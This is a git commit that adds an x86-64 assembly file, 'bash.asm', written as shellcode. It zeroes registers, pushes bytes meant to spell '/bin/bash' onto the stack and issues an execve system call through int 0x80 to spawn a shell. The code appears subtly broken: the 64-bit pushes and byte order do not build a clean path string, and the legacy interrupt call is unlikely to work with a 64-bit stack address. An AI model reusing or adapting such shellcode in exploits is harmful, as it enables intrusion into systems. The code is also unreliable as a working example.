9bcdd6a9846432176a01927c8a429150769c5b42
/34ZY <55347142+34zY@users.noreply.github.com>
2023-06-02 14:15:13 +0200

    Add files via upload

---
+++ bash.asm
@@ -0,0 +1,21 @@
+;; @Eazy
+
+bits 64
+
+section .text
+	global _start
+
+_start:
+	
+	xor rax, rax
+	xor rbx, rbx
+	xor rcx, rcx
+	xor rdx, rdx
+	push rax
+
+	push 0x2f2f6269
+	push 0x6e2f6261
+	push 0x73680000
+	mov rbx, rsp
+	mov al, 0xb ;; 0xb execve
+	int 0x80
